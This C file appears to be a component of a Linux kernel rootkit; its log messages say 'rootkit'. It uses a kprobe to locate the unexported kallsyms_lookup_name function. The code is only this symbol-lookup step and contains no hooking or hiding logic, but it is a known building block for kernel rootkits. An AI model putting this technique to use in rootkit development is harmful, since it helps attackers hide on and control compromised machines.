#include <linux/module.h>
#include <linux/kprobes.h>
#include "ksym.h"

kallsyms_lookup_name_t ksym_lookup_name;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

int ksym_init(void) {
    int ret;
    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("rootkit: failed to register kprobe\n");
        return ret;
    }
    ksym_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    if (!ksym_lookup_name) {
        pr_err("rootkit: kallsyms_lookup_name not found\n");
        return -ENOENT;
    }

    pr_info("rootkit: ksym found kallsyms_lookup_name at %px\n", ksym_lookup_name);
    return 0;
}

void ksym_cleanup(void) {
    // Nothing special
}
